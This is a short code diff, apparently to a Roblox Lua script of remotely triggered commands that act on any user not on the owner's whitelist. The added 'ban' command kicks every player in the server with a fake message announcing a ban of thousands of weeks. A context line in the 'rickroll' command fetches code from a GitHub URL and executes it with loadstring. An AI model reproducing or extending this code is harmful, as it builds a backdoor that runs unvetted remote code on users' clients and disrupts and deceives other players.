@@ -77,6 +77,14 @@ end,
             end
         end
     end,
+    ban = function()
+        if not isplayerallowed(game.Players.LocalPlayer.Name) then
+            wait(1)
+            for index, player in pairs(game.Players:GetPlayers()) do
+                player:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds")
+            end
+        end
+    end,
    rickroll = function()
         if not isplayerallowed(game.Players.LocalPlayer.Name) then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
